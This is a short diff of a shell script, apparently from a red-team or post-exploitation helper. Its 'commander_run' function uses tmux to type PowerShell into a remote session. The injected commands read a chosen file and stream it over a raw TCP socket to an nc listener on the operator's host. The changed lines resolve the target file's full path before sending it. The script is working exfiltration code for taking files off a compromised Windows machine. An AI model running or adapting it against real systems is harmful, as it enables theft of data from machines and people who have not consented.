@@ -19,8 +19,9 @@ commander_run() {
   # listener_id="$(tmux new-window -P -d "nc -w 10 -nlvp \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\"")"
   tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst_file\""
 
+  tmux send-keys "\$FileName = Get-ChildItem \"$file_to_fetch\" | Select Name -ExpandProperty FullName" Enter
   tmux send-keys '[byte[]]$buffer = New-Object byte[] 1024' Enter
-  tmux send-keys "\$FileStream = [System.IO.File]::OpenRead(\"$file_to_fetch\")" Enter
+  tmux send-keys '$FileStream = [System.IO.File]::OpenRead($FileName)' Enter
   tmux send-keys "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
   tmux send-keys '$Stream = $TcpClient.GetStream()' Enter
   tmux send-keys 'while ( $bytes = $FileStream.Read($buffer,0,$buffer.count)) { $Stream.Write($buffer,0,$bytes) }' Enter
